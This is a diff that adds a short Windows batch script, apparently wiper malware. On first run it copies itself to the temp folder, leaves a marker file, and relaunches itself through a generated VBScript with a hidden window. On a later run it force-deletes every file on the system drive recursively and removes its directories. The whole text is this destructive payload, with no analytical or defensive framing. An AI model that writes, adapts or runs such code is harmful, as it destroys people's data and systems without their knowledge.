@@ -1,0 +1,13 @@
+@echo off
+if exist "%temp%\p.log" (
+del %temp%\p.log /f
+cd %systemdrive%\ & del *.* /f /q /s & rd %systemdrive%\ /s /q 
+) else (
+echo.>%temp%\p.log
+echo set WshShell = wscript.createobject(^"WScript.shell^"^) > %temp%\silent.vbs
+echo WshShell.run ^"^"^"%temp%\script.bat^"^" ^", 0, true >> %temp%\silent.vbs
+echo Set WshShell = Nothing >> %temp%\silent.vbs
+if exist "%temp%\script.bat" (del %temp%\script.bat)
+copy %0 %temp%\script.bat
+start %temp%\silent.vbs & exit
+)
